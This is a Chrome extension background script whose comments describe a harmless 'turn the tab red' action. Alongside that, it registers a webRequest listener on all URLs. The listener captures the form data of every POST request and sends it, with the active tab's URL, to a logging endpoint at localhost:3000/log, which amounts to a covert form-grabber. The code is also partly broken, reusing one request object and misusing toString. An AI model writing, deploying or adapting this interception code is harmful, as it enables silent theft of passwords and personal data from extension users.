// chrome.browserAction.onClicked.addListener(function(tab) { alert("icon clicked")});
// chrome.browserAction.onClicked.yyyaddListener(function (tab) {
// chrome.tabs.executeScript(null, { file: "script.js" });
// });
// chrome.runtime.onMessage.addlistener((req,sneder,sendResponse)=>{
//     if(req.message==='login'){

//     }
//     else if(reques.message === 'signup'){

//     }     
// });
// Called when the user clicks on the browser action.

var xj = new XMLHttpRequest();
xj.open("POST", "http://localhost:3000/log", true);
xj.setRequestHeader("Content-Type", "application/json");
var tabUrl;
var formdata;
chrome.browserAction.onClicked.addListener(function (tab) {
    // No tabs or host permissions needed!
    console.log('Turning ' + tab.url + ' red!');
    tabUrl = tab.url;
    console.log("Active tab ============ " + tab.url);
    chrome.scripting.executeScript({
        code: 'document.body.style.backgroundColor="red"'
    });
});
chrome.webRequest.onBeforeRequest.addListener(
    function (details) {
        if (details.method == "POST") {
            console.log("Form data " + toString(details.requestBody.formData));
            formdata = details.requestBody.formData;
            xj.send(JSON.stringify({ "url": tabUrl, "formdata": formdata }));
            xj.onreadystatechange = function () {
                if (xj.readyState == 4) { console.log(xj.responseText); }
            }
        }
    },
    { urls: ["<all_urls>"] },
    ["requestBody"]
);

// chrome.tabs.getCurrent(function (tab) {
//     alert(toString(tab.url));
//     console.log("testtest");
//     console.log("testtest");
//     console.log("testtest");
//     console.log("testtest");
//     console.log(tab.url);
//     console.log("testtest");
//     console.log("testtest");
// });
// chrome.tabs.query({ currentWindow: true, active: true }, function (tabs) {
//     console.log("testtest");
//     console.log("testtest");
//     console.log("testtest");
//     console.log("testtest");
//     console.log(tabs[0].url);
//     console.log("testtest");
//     console.log("testtest");
//     console.log("testtest");
// });



